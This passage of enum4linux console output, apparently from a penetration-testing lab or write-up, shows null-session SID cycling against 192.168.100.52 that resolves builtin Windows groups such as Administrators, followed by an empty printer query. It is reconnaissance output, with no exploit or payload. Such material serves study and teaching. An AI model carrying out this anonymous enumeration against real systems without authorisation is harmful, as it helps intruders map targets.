S-1-5-21-1537581390-1319491092-4135932513-525 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-526 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-527 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-528 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-529 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-530 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-531 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-532 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-533 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-534 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-535 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-536 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-537 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-538 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-539 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-540 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-541 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-542 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-543 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-544 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-545 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-546 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-547 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-548 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-549 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-550 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1000 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1001 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1002 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1003 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1004 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1005 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1006 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1007 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1008 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1009 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1010 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1011 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1012 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1013 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1014 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1015 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1016 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1017 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1018 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1019 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1020 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1021 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1022 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1023 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1024 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1025 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1026 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1027 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1028 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1029 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1030 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1031 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1032 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1033 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1034 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1035 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1036 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1037 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1038 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1039 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1040 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1041 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1042 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1043 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1044 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1045 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1046 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1047 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1048 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1049 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-1050 *unknown*\\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\\*unknown* (8)
S-1-5-32-501 *unknown*\\*unknown* (8)
S-1-5-32-502 *unknown*\\*unknown* (8)
S-1-5-32-503 *unknown*\\*unknown* (8)
S-1-5-32-504 *unknown*\\*unknown* (8)
S-1-5-32-505 *unknown*\\*unknown* (8)
S-1-5-32-506 *unknown*\\*unknown* (8)
S-1-5-32-507 *unknown*\\*unknown* (8)
S-1-5-32-508 *unknown*\\*unknown* (8)
S-1-5-32-509 *unknown*\\*unknown* (8)
S-1-5-32-510 *unknown*\\*unknown* (8)
S-1-5-32-511 *unknown*\\*unknown* (8)
S-1-5-32-512 *unknown*\\*unknown* (8)
S-1-5-32-513 *unknown*\\*unknown* (8)
S-1-5-32-514 *unknown*\\*unknown* (8)
S-1-5-32-515 *unknown*\\*unknown* (8)
S-1-5-32-516 *unknown*\\*unknown* (8)
S-1-5-32-517 *unknown*\\*unknown* (8)
S-1-5-32-518 *unknown*\\*unknown* (8)
S-1-5-32-519 *unknown*\\*unknown* (8)
S-1-5-32-520 *unknown*\\*unknown* (8)
S-1-5-32-521 *unknown*\\*unknown* (8)
S-1-5-32-522 *unknown*\\*unknown* (8)
S-1-5-32-523 *unknown*\\*unknown* (8)
S-1-5-32-524 *unknown*\\*unknown* (8)
S-1-5-32-525 *unknown*\\*unknown* (8)
S-1-5-32-526 *unknown*\\*unknown* (8)
S-1-5-32-527 *unknown*\\*unknown* (8)
S-1-5-32-528 *unknown*\\*unknown* (8)
S-1-5-32-529 *unknown*\\*unknown* (8)
S-1-5-32-530 *unknown*\\*unknown* (8)
S-1-5-32-531 *unknown*\\*unknown* (8)
S-1-5-32-532 *unknown*\\*unknown* (8)
S-1-5-32-533 *unknown*\\*unknown* (8)
S-1-5-32-534 *unknown*\\*unknown* (8)
S-1-5-32-535 *unknown*\\*unknown* (8)
S-1-5-32-536 *unknown*\\*unknown* (8)
S-1-5-32-537 *unknown*\\*unknown* (8)
S-1-5-32-538 *unknown*\\*unknown* (8)
S-1-5-32-539 *unknown*\\*unknown* (8)
S-1-5-32-540 *unknown*\\*unknown* (8)
S-1-5-32-541 *unknown*\\*unknown* (8)
S-1-5-32-542 *unknown*\\*unknown* (8)
S-1-5-32-543 *unknown*\\*unknown* (8)
S-1-5-32-544 BUILTIN\\Administrators (Local Group)
S-1-5-32-545 BUILTIN\\Users (Local Group)
S-1-5-32-546 BUILTIN\\Guests (Local Group)
S-1-5-32-547 BUILTIN\\Power Users (Local Group)
S-1-5-32-548 BUILTIN\\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\\*unknown* (8)
S-1-5-32-1001 *unknown*\\*unknown* (8)
S-1-5-32-1002 *unknown*\\*unknown* (8)
S-1-5-32-1003 *unknown*\\*unknown* (8)
S-1-5-32-1004 *unknown*\\*unknown* (8)
S-1-5-32-1005 *unknown*\\*unknown* (8)
S-1-5-32-1006 *unknown*\\*unknown* (8)
S-1-5-32-1007 *unknown*\\*unknown* (8)
S-1-5-32-1008 *unknown*\\*unknown* (8)
S-1-5-32-1009 *unknown*\\*unknown* (8)
S-1-5-32-1010 *unknown*\\*unknown* (8)
S-1-5-32-1011 *unknown*\\*unknown* (8)
S-1-5-32-1012 *unknown*\\*unknown* (8)
S-1-5-32-1013 *unknown*\\*unknown* (8)
S-1-5-32-1014 *unknown*\\*unknown* (8)
S-1-5-32-1015 *unknown*\\*unknown* (8)
S-1-5-32-1016 *unknown*\\*unknown* (8)
S-1-5-32-1017 *unknown*\\*unknown* (8)
S-1-5-32-1018 *unknown*\\*unknown* (8)
S-1-5-32-1019 *unknown*\\*unknown* (8)
S-1-5-32-1020 *unknown*\\*unknown* (8)
S-1-5-32-1021 *unknown*\\*unknown* (8)
S-1-5-32-1022 *unknown*\\*unknown* (8)
S-1-5-32-1023 *unknown*\\*unknown* (8)
S-1-5-32-1024 *unknown*\\*unknown* (8)
S-1-5-32-1025 *unknown*\\*unknown* (8)
S-1-5-32-1026 *unknown*\\*unknown* (8)
S-1-5-32-1027 *unknown*\\*unknown* (8)
S-1-5-32-1028 *unknown*\\*unknown* (8)
S-1-5-32-1029 *unknown*\\*unknown* (8)
S-1-5-32-1030 *unknown*\\*unknown* (8)
S-1-5-32-1031 *unknown*\\*unknown* (8)
S-1-5-32-1032 *unknown*\\*unknown* (8)
S-1-5-32-1033 *unknown*\\*unknown* (8)
S-1-5-32-1034 *unknown*\\*unknown* (8)
S-1-5-32-1035 *unknown*\\*unknown* (8)
S-1-5-32-1036 *unknown*\\*unknown* (8)
S-1-5-32-1037 *unknown*\\*unknown* (8)
S-1-5-32-1038 *unknown*\\*unknown* (8)
S-1-5-32-1039 *unknown*\\*unknown* (8)
S-1-5-32-1040 *unknown*\\*unknown* (8)
S-1-5-32-1041 *unknown*\\*unknown* (8)
S-1-5-32-1042 *unknown*\\*unknown* (8)
S-1-5-32-1043 *unknown*\\*unknown* (8)
S-1-5-32-1044 *unknown*\\*unknown* (8)
S-1-5-32-1045 *unknown*\\*unknown* (8)
S-1-5-32-1046 *unknown*\\*unknown* (8)
S-1-5-32-1047 *unknown*\\*unknown* (8)
S-1-5-32-1048 *unknown*\\*unknown* (8)
S-1-5-32-1049 *unknown*\\*unknown* (8)
S-1-5-32-1050 *unknown*\\*unknown* (8)

 =============================================== 
|    Getting printer info for 192.168.100.52    |
 =============================================== 
No printers returned.

enum4linux complete on Sat Mar 25 00:01:19 2023
```